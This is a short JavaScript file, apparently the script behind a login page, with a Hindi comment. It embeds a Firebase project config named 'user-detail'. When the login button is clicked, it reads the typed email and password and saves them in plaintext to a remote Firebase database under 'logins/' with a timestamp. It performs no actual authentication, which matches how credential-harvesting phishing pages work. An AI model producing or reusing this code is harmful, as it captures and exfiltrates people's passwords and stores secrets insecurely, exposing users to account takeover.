
  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.0/firebase-app.js";
  import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.6.0/firebase-database.js";

  const firebaseConfig = {
    apiKey: "AIzaSyCq8sky8d8SowD7FwJiqOAftDZZ5WC4sRc",
    authDomain: "user-detail-f9d15.firebaseapp.com",
    databaseURL: "https://user-detail-f9d15-default-rtdb.firebaseio.com",
    projectId: "user-detail-f9d15",
    storageBucket: "user-detail-f9d15.appspot.com",
    messagingSenderId: "1008052101145",
    appId: "1:1008052101145:web:b36468a26edbc1e5abca88",
    measurementId: "G-VFF6NHYFV8"
  };

  const app = initializeApp(firebaseConfig);
  const database = getDatabase(app);

  // Login बटन पर क्लिक होने पर डेटा सेव करें
  document.querySelector("button").addEventListener("click", () => {
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    if (email && password) {
      set(ref(database, "logins/" + Date.now()), {
        email: email,
        password: password
      }).then(() => {
        alert("Login Data Saved to Firebase!");
      }).catch((error) => {
        alert("Error: " + error);
      });
    } else {
      alert("Please fill both fields.");
    }
  });
